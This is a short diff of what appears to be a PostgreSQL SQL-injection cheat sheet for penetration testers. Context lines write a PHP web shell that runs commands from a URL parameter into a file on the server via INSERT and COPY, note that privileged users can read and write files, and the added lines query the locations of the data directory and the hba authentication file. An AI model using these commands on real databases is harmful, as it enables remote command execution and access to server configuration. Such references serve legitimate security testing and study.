@@ -57,4 +57,6 @@ INSERT INTO mytable(mycol) VALUES (‘<? pasthru($_GET[cmd]); ?>’);
 COPY mytable (mycol) TO ‘/tmp/test.php’; –priv, write files as postgres OS-level user.  Generally you won’t be able to write to the web root, but it’s always work a try.
 – priv user can also read/write files by mapping libc functions
 
-
+#Location of DB files   
+SELECT current_setting(‘data_directory’); — priv
+SELECT current_setting(‘hba_file’); — priv
